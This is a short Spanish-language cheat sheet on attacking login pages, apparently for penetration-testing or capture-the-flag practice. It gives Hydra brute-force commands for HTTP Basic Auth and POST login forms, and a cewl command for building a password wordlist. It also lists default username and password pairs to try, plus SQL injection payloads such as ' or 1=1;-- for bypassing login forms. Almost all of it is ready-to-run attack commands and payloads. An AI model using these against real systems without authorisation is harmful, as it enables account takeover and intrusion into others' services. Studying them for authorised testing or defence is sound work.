
# 🔐 Ataques de fuerza bruta y bypass de login

## 🔸 **Hydra: Ataques con credenciales**

### 🔹 **Autenticación básica (HTTP Basic Auth)**
```bash
hydra -l user -P /usr/share/wordlists/rockyou.txt -f $ip http-get /path
```

### 🔹 **Formulario de login (HTTP POST Form)**
```bash
hydra -L users.txt -P users.txt $ip http-post-form "<directory>:login_username=^USER^&secretkey=^PASS^&<rest of post request>:<error message>"
```

---

## 🛠️ Crear lista personalizada de contraseñas con `cewl`
```bash
cewl -w cewl_passlist.txt -d 5 $RHOST/index.pl
```

---

## 📋 Credenciales estándar para probar cuando el portal bloquea intentos
```
admin:admin  
admin:password  
admin:administrator  
admin:(nombre de la máquina)  
user:user  
user:password  
user:12345  
guest:guest  
root:root  
(nombre de la máquina):(nombre de la máquina)  
(cuenta por defecto):(nombre de la app)  

admin:<en blanco>  
admin:<nombre del servicio>  
<servicio>:<servicio>  
root:admin  
root:password  
root:<nombre del servicio>  
<usuario>:password  
<usuario>:admin  
<usuario>:usuario  
usuario:<nombre del servicio>
```

---

## 🧨 Payloads de **SQL Injection** para saltarse formularios de login
```sql
' or 1=1;--  
' or '1'='1  
' or 1=1;#  
') or ('x'='x  
' or <columna> like '%';--  
' or 1=1 LIMIT 1;--  

admin' --  
admin' #  
admin'/*  

' or 1=1--  
' or 1=1#  
' or 1=1/*  

') or '1'='1--  
') or ('1'='1—  
' or 1/*  
 */ =1 --

admin' or 'a'='a  
'#
```